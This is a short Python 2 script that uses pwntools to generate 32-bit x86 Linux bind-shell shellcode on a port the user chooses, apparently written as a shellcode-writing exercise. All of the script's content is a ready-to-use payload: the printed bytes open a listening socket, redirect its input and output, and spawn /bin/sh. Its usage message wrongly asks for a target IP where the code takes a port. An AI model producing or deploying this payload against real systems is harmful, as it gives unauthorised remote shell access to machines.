#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Program       = BindShell.py                                                                #
# Description   = change port to whatever your input is                                       #
# Date          = 1/12/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python BindShell.py <port>                                                  #        
#---------------------------------------------------------------------------------------------#

import sys
from pwn import *

#---------------#---------#  
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#


if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python BindShell.py <target IP>" +W
  print Y+ "Example             :" + P+  " python BindShell.py 1337       " +W
  sys.exit(0)

port = int(sys.argv[1])

if port < 1 or port > 65535:
  print "Please specify port number between 1 and 65535"
  exit()

if port <= 1024:
  print "This port requires root privileges!"


context.endian='big'
context.arch='i386'
context.bits=32
context.log_level="debug"

test = repr(p16(port))
test = test.replace("'", "")
print "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x5f\\x52\\x66\\x68" + test + "\\x66\\x53\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x5a\\xb0\\x66\\x80\\xc3\\x02\\xcd\\x80\\x50\\x50\\xb0\\x66\\x43\\x52\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

